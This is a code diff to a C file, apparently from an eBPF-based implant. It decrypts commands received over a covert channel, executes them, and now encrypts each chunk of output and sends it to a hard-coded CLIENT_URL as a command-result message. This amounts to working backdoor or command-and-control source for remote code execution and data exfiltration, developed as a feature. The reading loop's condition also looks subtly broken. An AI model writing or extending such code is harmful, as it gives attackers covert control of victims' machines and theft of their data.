@@ -28,14 +28,16 @@ static int find_map_fd(const struct bpf_object *bpf_obj, const char *map_name)
 static void handle_message(struct message_details *message_details)
 {
   FILE *cmd;
-  unsigned char command[MESSAGE_BUF_SIZE];
-  char cmd_output[MESSAGE_BUF_SIZE], buf[MESSAGE_BUF_SIZE];
+  unsigned char command[BUF_SIZE];
+  char cmd_output[BUF_SIZE / 2];
   struct message message;
-  // size_t n;
+  int ciphertext_len;
+  unsigned char nonce[crypto_secretbox_NONCEBYTES], nonce_hex[crypto_secretbox_NONCEBYTES * 2];
+  unsigned char ciphertext_hex[BUF_SIZE * 2], ciphertext[BUF_SIZE];
+  unsigned char res_message[MESSAGE_BUF_SIZE];
 
   // reset buffers
   memset(cmd_output, 0, sizeof(cmd_output));
-  memset(buf, 0, sizeof(buf));
 
   // skip if no data
   if (strlen((const char *)message_details->message) == 0)
@@ -47,9 +49,9 @@ static void handle_message(struct message_details *message_details)
   parse_message(message_details->message, &message);
   if (decrypt(command, message.ciphertext, message.ciphertext_len, message.nonce, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH) < 0)
   {
+    log_error("decrypt");
     return;
   }
-
 
   if (message.type == TYPE_EXECUTE_CMD)
   {
@@ -62,12 +64,37 @@ static void handle_message(struct message_details *message_details)
     }
 
     printf("%s\n", command);
+    // collect command result and send the result
+    while (fread(cmd_output, sizeof(cmd_output), 1, cmd) <= 0)
+    {
+      if (ferror(cmd) != 0)
+      {
+        log_error("fread");
+        break;
+      }
+      randombytes_buf(nonce, sizeof(nonce));
 
-    // collect command result
-    // while ((n = fread(buf, sizeof(buf), 1, cmd) > 0))
-    // {
-    //   printf("TODO: implement command responses: %zu\n", n);
-    // }
+      if ((ciphertext_len = encrypt(ciphertext, (unsigned char *)cmd_output, sizeof(cmd_output), nonce, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH)) < 0)
+      {
+        log_error("encrypt");
+        break;
+      }
+
+      to_hex(ciphertext, ciphertext_len, ciphertext_hex);
+      to_hex(nonce, sizeof(nonce), nonce_hex);
+      if (craft_message(res_message, AUTH_HEADER, 0, TYPE_SEND_CMD_RESULT, ciphertext_len, ciphertext_hex, nonce_hex) < 0)
+      {
+        log_error("craft_message");
+        break;
+      }
+
+      // TODO: fix to use dynamic IP
+      send_request((unsigned char *)res_message, CLIENT_URL);
+
+      // break when the last segment is read
+      if (feof(cmd) != 0)
+        break;
+    }
 
     pclose(cmd);
   }
